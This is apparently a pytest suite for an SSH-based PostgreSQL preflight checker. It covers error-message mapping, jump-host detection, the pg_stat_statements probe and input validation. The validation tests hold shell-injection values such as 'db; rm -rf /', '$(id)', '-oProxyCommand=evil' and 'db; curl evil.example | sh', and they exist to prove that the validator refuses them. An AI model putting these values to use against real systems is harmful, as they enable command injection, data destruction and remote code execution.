"""Preflight. Spec: .kiro/specs/ssh-collection (SSH-5, HOST-1).

Nothing here connects to a host or a database: the command executor is a fake.
"""
import logging

import pytest
from fastapi.testclient import TestClient

from src.agents.collector import preflight as pf
from src.agents.collector.preflight import run_preflight, target_problems
from src.agents.collector.preflight_messages import describe_failure
from src.api import common
from src.api.main import app
from src.api.routes import preflight as route
from src.contracts.collector_input import CollectorInput

PREFIX = "/api/v1"
VERSION = "PostgreSQL 15.4 on x86_64-pc-linux-gnu, compiled by gcc"
LEAK = "ec2-user@secret-host.corp.example"
LIVE = {"ssh_target": "ec2-user@db-host.example.internal", "db_user": "apcat_ro",
        "password_file": "/home/ec2-user/.apcat-db-password"}  # nosec B105 - test value, not a password


def payload(**over) -> dict:
    body = {
        "cluster_endpoint": "127.0.0.1", "port": 5432, "database_name": "appdb",
        "mode": "live", "live_config": dict(LIVE),
    }
    body.update(over)
    return body


def inp(**over) -> CollectorInput:
    return CollectorInput.model_validate({"job_id": "preflight", **payload(**over)})


class FakeExecutor:
    """Answers what preflight asks, and records every call."""

    def __init__(self, preload="pg_stat_statements", ext="t", version=VERSION,
                 server_addr="127.0.0.1", local_addrs="10.0.0.5 fd00::5",
                 ssh_error: Exception | None = None, sql_error: Exception | None = None,
                 probe_error: Exception | None = None, here: bool = True):
        self.preload, self.ext, self.version = preload, ext, version
        self.server_addr, self.local_addrs = server_addr, local_addrs
        self.ssh_error, self.sql_error, self.probe_error = ssh_error, sql_error, probe_error
        self.here = here
        if not here:  # a database on another machine
            self.server_addr = "10.9.9.9"
        self.calls: list[dict] = []
        self.commands: list[str] = []
        self.closed = False

    def run_command(self, command, timeout=300):
        self.commands.append(command)
        if command == "true" and self.ssh_error:
            raise self.ssh_error
        if command == pf.LOCAL_ADDRESSES_COMMAND:
            return self.local_addrs
        return ""

    def run_sql_json(self, **kw):
        self.calls.append(kw)
        if "shared_preload_libraries" in kw["sql"]:
            if self.probe_error:
                raise self.probe_error
            return [{"preload": self.preload, "ext_installed": self.ext}]
        if self.sql_error:
            raise self.sql_error
        if "inet_server_addr" in kw["sql"]:
            return [{"addr": self.server_addr}]
        return [{"version": self.version}] if self.version else []

    def close(self):
        self.closed = True


def check(result, name):
    return next(c for c in result.checks if c.name == name)


def statuses(result) -> dict[str, str]:
    return {c.name: c.status for c in result.checks}


# ---------------------------------------------------------------------------
# The happy path
# ---------------------------------------------------------------------------


def test_every_check_passes_on_a_healthy_target():
    ex = FakeExecutor()
    r = run_preflight(inp(), executor=ex)

    assert r.ok is True
    assert [c.name for c in r.checks] == [
        "ssh", "database", "database_host", "pg_stat_statements"]
    assert set(statuses(r).values()) == {"pass"}
    assert r.database_version == "PostgreSQL 15.4"  # not the whole build string
    assert r.pg_stat_statements_available is True
    assert r.duration_seconds >= 0
    assert "x86_64" not in r.model_dump_json()
    assert ex.commands == ["true"]  # a loopback address needs no look at the host's addresses


def test_the_database_calls_are_capped_and_use_the_submitted_target():
    ex = FakeExecutor()
    run_preflight(inp(port=6432), executor=ex)
    assert len(ex.calls) == 3  # the version, the server address, and the extension probe
    for call in ex.calls:
        assert call["timeout"] == pf.SQL_TIMEOUT_SECONDS == 60
        assert (call["host"], call["port"], call["database"]) == ("127.0.0.1", 6432, "appdb")


def test_nothing_is_written_and_no_job_is_made(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    run_preflight(inp(), executor=FakeExecutor())
    assert list(tmp_path.iterdir()) == []


def test_an_injected_executor_is_left_open_and_a_built_one_is_closed(monkeypatch):
    injected = FakeExecutor()
    run_preflight(inp(), executor=injected)
    assert injected.closed is False

    built = FakeExecutor()
    monkeypatch.setattr(pf, "executor_for", lambda i: built)
    run_preflight(inp())
    assert built.closed is True


def test_a_built_executor_is_closed_even_when_ssh_fails(monkeypatch):
    built = FakeExecutor(ssh_error=RuntimeError("ssh command failed (rc=255): x"))
    monkeypatch.setattr(pf, "executor_for", lambda i: built)
    assert run_preflight(inp()).ok is False
    assert built.closed is True


# ---------------------------------------------------------------------------
# What each failure looks like
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("error,message", [
    ("ssh command failed (rc=255): Host key verification failed.",
     "The host key is not trusted."),
    ("ssh command failed (rc=255): WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!",
     "The host key is not trusted."),
    ("ssh command failed (rc=255): ec2-user@secret-host.corp.example: Permission denied "
     "(publickey,gssapi-keyex).", "The host refused the key or the user."),
    ("ssh command failed (rc=255): ssh: Could not resolve hostname secret-host.corp.example: "
     "Name or service not known", "The SSH host name did not resolve."),
    ("ssh command failed (rc=255): ssh: connect to host 10.0.0.9 port 22: Connection timed out",
     "The server could not reach the SSH port."),
    ("ssh command failed (rc=255): ssh: connect to host 10.0.0.9 port 22: No route to host",
     "The server could not reach the SSH port."),
    ("the known_hosts file does not exist", "The server has no known_hosts file."),
    ("SSH_KEY_DIR is not set, so no key can be chosen by name",
     "A key was named but the server has no key directory."),
    ("the key file does not exist", "The named key is not in the server's key directory."),
    ("the key file can be read by group or others", "The key file's permissions are too open."),
    ("something nobody planned for", "The check failed."),
])
def test_an_ssh_failure_stops_everything_after_it_with_fixed_text(error, message):
    ex = FakeExecutor(ssh_error=RuntimeError(error))
    r = run_preflight(inp(), executor=ex)
    assert r.ok is False
    assert statuses(r) == {"ssh": "fail", "database": "skipped", "database_host": "skipped",
                           "pg_stat_statements": "skipped"}
    assert check(r, "ssh").message == message
    assert ex.calls == []  # no SQL was sent
    text = r.model_dump_json()
    for fragment in (LEAK, "secret-host", "10.0.0.9", "gssapi"):
        assert fragment not in text


@pytest.mark.parametrize("error,message", [
    ('ssh command failed (rc=2): psql: error: connection to server at "127.0.0.1", port 5432 '
     'failed: FATAL:  password authentication failed for user "orders_app"',
     "The database rejected the user name or password."),
    ("ssh command failed (rc=2): psql: error: connection to server at 127.0.0.1 failed: "
     "Connection refused", "The connection was refused."),
    ('ssh command failed (rc=2): psql: error: FATAL:  database "appdb" does not exist',
     "The database or role was not found."),
    ("ssh command failed (rc=2): cat: /home/ec2-user/.apcat-db-password: No such file or "
     "directory", "The password file could not be read on the host."),
    ("ssh command failed (rc=127): bash: psql: command not found",
     "psql is not installed on the database host."),
    ("ssh command failed (rc=2): psql: error: no pg_hba.conf entry for host",
     "The database does not allow this connection."),
    ("ssh command timed out after 60s", "The host did not answer in time."),
    ("something nobody planned for", "The check failed."),
])
def test_a_database_error_becomes_fixed_text_that_never_echoes_the_error(error, message):
    r = run_preflight(inp(), executor=FakeExecutor(sql_error=RuntimeError(error)))
    assert statuses(r) == {"ssh": "pass", "database": "fail", "database_host": "skipped",
                           "pg_stat_statements": "skipped"}
    assert check(r, "database").message == message
    assert r.ok is False and r.database_version is None
    text = r.model_dump_json()
    for fragment in ("orders_app", "FATAL", "apcat-db-password", "127.0.0.1\""):
        assert fragment not in text


def test_an_empty_answer_from_the_database_is_a_failure():
    r = run_preflight(inp(), executor=FakeExecutor(version=""))
    assert statuses(r)["database"] == "fail"


# --- the SSH host is the database host ---------------------------------------


def test_a_jump_host_is_refused_because_its_metrics_would_describe_the_wrong_machine():
    r = run_preflight(inp(), executor=FakeExecutor(here=False))
    assert r.ok is False
    assert statuses(r) == {"ssh": "pass", "database": "pass", "database_host": "fail",
                           "pg_stat_statements": "skipped"}
    c = check(r, "database_host")
    assert "not the machine PostgreSQL runs on" in c.message
    assert "jump host" in c.hint and "127.0.0.1" in c.hint
    assert r.database_version == "PostgreSQL 15.4"  # the login itself did work


def test_a_server_address_that_is_one_of_the_ssh_hosts_own_passes():
    ex = FakeExecutor(server_addr="10.0.0.5", local_addrs="10.0.0.5 fd00::5")
    r = run_preflight(inp(cluster_endpoint="10.0.0.5"), executor=ex)
    assert statuses(r)["database_host"] == "pass" and r.ok is True
    assert ex.commands == ["true", pf.LOCAL_ADDRESSES_COMMAND]


@pytest.mark.parametrize("server,local", [
    ("fd00::5", "10.0.0.5 fd00::5"),                  # IPv6
    ("FD00:0:0:0:0:0:0:5", "fd00::5"),                # the same address written differently
    ("10.0.0.5", "10.0.0.5/24\n172.17.0.1/16\n"),     # `ip addr` style, with prefix lengths
    ("10.0.0.5", "fe80::1%eth0 10.0.0.5"),            # a zone id on another address
])
def test_the_address_comparison_reads_the_usual_forms(server, local):
    r = run_preflight(inp(), executor=FakeExecutor(server_addr=server, local_addrs=local))
    assert statuses(r)["database_host"] == "pass"


@pytest.mark.parametrize("server", ["127.0.0.1", "127.0.1.1", "::1"])
def test_a_loopback_address_means_the_connection_never_left_the_ssh_host(server):
    ex = FakeExecutor(server_addr=server)
    assert statuses(run_preflight(inp(), executor=ex))["database_host"] == "pass"
    assert ex.commands == ["true"]


@pytest.mark.parametrize("server", [None, ""])
def test_a_unix_socket_has_no_address_and_is_on_the_ssh_host(server):
    ex = FakeExecutor(server_addr=server)
    assert statuses(run_preflight(inp(), executor=ex))["database_host"] == "pass"


def test_a_pooler_in_front_of_a_remote_database_is_caught():
    """The endpoint is loopback, but PostgreSQL answers on an address that is not this host's."""
    ex = FakeExecutor(server_addr="10.9.9.9", local_addrs="10.0.0.5")
    r = run_preflight(inp(cluster_endpoint="127.0.0.1"), executor=ex)
    assert statuses(r)["database_host"] == "fail"


def test_an_address_that_is_not_an_address_never_reaches_a_shell():
    ex = FakeExecutor(server_addr="10.0.0.5; touch /tmp/x")
    r = run_preflight(inp(), executor=ex)
    assert statuses(r)["database_host"] == "fail"
    assert not any("touch" in c for c in ex.commands)


def test_a_failure_asking_for_the_server_address_is_a_failed_check():
    class NoAddr(FakeExecutor):
        def run_sql_json(self, **kw):
            if "inet_server_addr" in kw["sql"]:
                raise RuntimeError("ssh command failed (rc=2): psql: error: permission denied")
            return super().run_sql_json(**kw)

    assert statuses(run_preflight(inp(), executor=NoAddr()))["database_host"] == "fail"


def test_a_failure_listing_the_hosts_addresses_is_a_failed_check():
    class NoList(FakeExecutor):
        def run_command(self, command, timeout=300):
            if command == pf.LOCAL_ADDRESSES_COMMAND:
                raise RuntimeError("ssh command failed (rc=127): nothing printed")
            return super().run_command(command, timeout)

    r = run_preflight(inp(), executor=NoList(server_addr="10.0.0.5"))
    assert statuses(r)["database_host"] == "fail"


# --- pg_stat_statements --------------------------------------------------------


def test_a_missing_extension_is_a_warning_not_a_failure():
    r = run_preflight(inp(), executor=FakeExecutor(preload="", ext="f"))
    assert r.ok is True and r.pg_stat_statements_available is False
    c = check(r, "pg_stat_statements")
    assert c.status == "warn" and "RESTART" in c.message
    assert "degraded mode" in c.hint


def test_an_extension_that_is_preloaded_but_not_created_is_not_available():
    """psql prints the boolean as t or f. The string "f" must not count as true."""
    r = run_preflight(inp(), executor=FakeExecutor(preload="pg_stat_statements", ext="f"))
    assert r.pg_stat_statements_available is False
    assert "CREATE EXTENSION" in check(r, "pg_stat_statements").message


def test_the_probe_reads_a_real_boolean_too():
    assert run_preflight(inp(), executor=FakeExecutor(ext=True)).pg_stat_statements_available
    assert run_preflight(
        inp(), executor=FakeExecutor(ext=False)).pg_stat_statements_available is False


def test_a_probe_that_cannot_run_is_a_warning():
    r = run_preflight(inp(), executor=FakeExecutor(
        probe_error=RuntimeError("permission denied")))
    assert statuses(r)["pg_stat_statements"] == "warn" and r.ok is True
    assert r.pg_stat_statements_available is None
    assert "permission denied" not in r.model_dump_json()


def test_the_full_error_goes_to_the_log_and_not_to_the_caller(caplog):
    with caplog.at_level(logging.WARNING, logger=pf.logger.name):
        r = run_preflight(inp(), executor=FakeExecutor(
            ssh_error=RuntimeError("ssh command failed (rc=255): " + LEAK + ": Permission denied")))
    assert LEAK not in r.model_dump_json()
    assert LEAK in caplog.text


# ---------------------------------------------------------------------------
# Messages
# ---------------------------------------------------------------------------


def test_describe_failure_never_returns_the_errors_own_text():
    msg, hint = describe_failure(RuntimeError("Permission denied (publickey) for " + LEAK))
    assert LEAK not in msg + hint
    assert msg == "The host refused the key or the user."


def test_an_unknown_error_gets_the_default_message_and_hint():
    assert describe_failure(RuntimeError("zzz")) == (
        "The check failed.", "See the server log for the full error.")


# ---------------------------------------------------------------------------
# Input is checked before anything is called
# ---------------------------------------------------------------------------


GOOD = [
    {}, {"cluster_endpoint": "10.0.1.50"}, {"cluster_endpoint": "fd00::5"},
    {"database_name": "orders_v2.prod-1"},
    {"live_config": {**LIVE, "ssh_target": "db1", "ssh_port": 2222}},
    {"live_config": {**LIVE, "identity_file": "apcat_ed25519"}},
]


@pytest.mark.parametrize("over", GOOD)
def test_ordinary_targets_are_accepted(over):
    assert target_problems(inp(**over)) == []


BAD = [
    ({"cluster_endpoint": "db; rm -rf /"}, "cluster_endpoint"),
    ({"cluster_endpoint": "db$(id)"}, "cluster_endpoint"),
    ({"cluster_endpoint": "db'x"}, "cluster_endpoint"),
    ({"cluster_endpoint": "-h evil"}, "cluster_endpoint"),
    ({"cluster_endpoint": "a" * 300}, "cluster_endpoint"),
    ({"database_name": "app db"}, "database_name"),
    ({"database_name": "app`id`"}, "database_name"),
    ({"database_name": "$HOME"}, "database_name"),
    ({"database_name": "x" * 64}, "database_name"),
    ({"port": 0}, "port"),
    ({"port": 70000}, "port"),
    ({"live_config": {**LIVE, "ssh_target": "-oProxyCommand=evil"}}, "ssh_target"),
    ({"live_config": {**LIVE, "ssh_target": "a b"}}, "ssh_target"),
    ({"live_config": {**LIVE, "db_user": "a;b"}}, "db_user"),
    ({"live_config": {**LIVE, "password_file": "/a/../b"}}, "password_file"),  # nosec B105 - test value, not a password
    ({"live_config": {**LIVE, "password_file": "relative"}}, "password_file"),  # nosec B105 - test value, not a password
    ({"live_config": {**LIVE, "identity_file": "../k"}}, "identity_file"),
]


@pytest.mark.parametrize("over,field", BAD)
def test_a_value_that_could_reach_a_shell_is_refused_and_not_echoed(over, field):
    problems = target_problems(inp(**over))
    assert problems and any(field in p for p in problems)
    for value in ("rm -rf", "$(id)", "evil", "`id`"):
        assert not any(value in p for p in problems)


def test_run_preflight_refuses_a_bad_target_before_calling_anything():
    ex = FakeExecutor()
    with pytest.raises(ValueError, match="cluster_endpoint"):
        run_preflight(inp(cluster_endpoint="db; id"), executor=ex)
    assert ex.calls == [] and ex.commands == []


# ---------------------------------------------------------------------------
# The route
# ---------------------------------------------------------------------------


@pytest.fixture
def client(tmp_path, monkeypatch) -> TestClient:
    monkeypatch.setattr(common, "ARTIFACT_ROOT", str(tmp_path))
    return TestClient(app, client=("127.0.0.1", 50000))


@pytest.fixture
def healthy(monkeypatch):
    seen = []

    def fake(req):
        seen.append(req)
        return run_preflight(req, executor=FakeExecutor())

    monkeypatch.setattr(route, "run_preflight", fake)
    return seen


def test_the_route_returns_the_result_and_needs_no_job_id(client, healthy, tmp_path):
    r = client.post(f"{PREFIX}/assessments/preflight", json=payload())
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["ok"] is True and body["database_version"] == "PostgreSQL 15.4"
    assert [c["name"] for c in body["checks"]] == [
        "ssh", "database", "database_host", "pg_stat_statements"]
    assert healthy[0].job_id == "preflight"
    assert list(tmp_path.iterdir()) == []  # no job folder


def test_a_failed_check_is_still_a_200_with_ok_false(client, monkeypatch):
    monkeypatch.setattr(route, "run_preflight", lambda req: run_preflight(
        req, executor=FakeExecutor(here=False)))
    r = client.post(f"{PREFIX}/assessments/preflight", json=payload())
    assert r.status_code == 200 and r.json()["ok"] is False


def test_a_dangerous_value_is_a_422_and_nothing_is_called(client, monkeypatch):
    called = []
    monkeypatch.setattr(route, "run_preflight", lambda req: called.append(req))
    r = client.post(f"{PREFIX}/assessments/preflight",
                    json=payload(cluster_endpoint="db; curl evil.example | sh"))
    assert r.status_code == 422
    assert "cluster_endpoint" in r.json()["detail"] and "evil" not in r.text
    assert called == []


def test_a_body_that_is_not_a_live_submit_is_a_422(client):
    assert client.post(f"{PREFIX}/assessments/preflight", json={}).status_code == 422
    no_live = payload()
    del no_live["live_config"]
    assert client.post(f"{PREFIX}/assessments/preflight", json=no_live).status_code == 422


def test_the_old_access_fields_are_a_422(client):
    body = payload()
    body["aws_config"] = {"region": "us-east-1"}
    assert client.post(f"{PREFIX}/assessments/preflight", json=body).status_code == 422


def test_only_four_preflights_run_at_once(client, monkeypatch):
    held = [route._slots.acquire(blocking=False) for _ in range(common.MAX_CONCURRENT_PREFLIGHTS)]
    try:
        assert all(held)
        r = client.post(f"{PREFIX}/assessments/preflight", json=payload())
        assert r.status_code == 429 and r.headers["retry-after"] == "10"
    finally:
        for ok in held:
            if ok:
                route._slots.release()


def test_the_slot_is_given_back_after_an_error(client, monkeypatch):
    def boom(_req):
        raise RuntimeError("unexpected")

    monkeypatch.setattr(route, "run_preflight", boom)
    quiet = TestClient(app, client=("127.0.0.1", 50000), raise_server_exceptions=False)
    for _ in range(common.MAX_CONCURRENT_PREFLIGHTS + 2):
        assert quiet.post(f"{PREFIX}/assessments/preflight", json=payload()).status_code == 500


def test_preflight_is_typed_and_behind_the_loopback_gate(tmp_path, monkeypatch):
    schema = app.openapi()["paths"][f"{PREFIX}/assessments/preflight"]["post"]
    assert schema["operationId"] == "preflight"
    assert schema["responses"]["200"]["content"]["application/json"]["schema"]
    monkeypatch.setattr(common, "ARTIFACT_ROOT", str(tmp_path))
    remote = TestClient(app, client=("203.0.113.7", 50000))
    assert remote.post(f"{PREFIX}/assessments/preflight", json=payload()).status_code == 403
